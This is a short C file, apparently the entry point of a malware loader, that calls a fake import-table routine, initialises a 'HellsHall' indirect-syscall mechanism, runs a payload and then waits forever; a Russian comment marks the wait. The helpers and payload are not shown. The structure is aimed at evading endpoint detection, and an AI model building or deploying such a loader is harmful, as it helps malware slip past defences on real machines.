#include <helper.h>

int main()
{
    int rez = FakeIat();
    rez = HellsHallInit();
    if (rez != TRUE)
    {
        PRINTA("Fail Init HellsHall \n");
        WaitForSingleObject((HANDLE)-1, INFINITE);
        return 1;
    }

    RunPayload();

    // бесконечное ожидание
    WaitForSingleObject((HANDLE)-1, INFINITE);

    return 0;
}
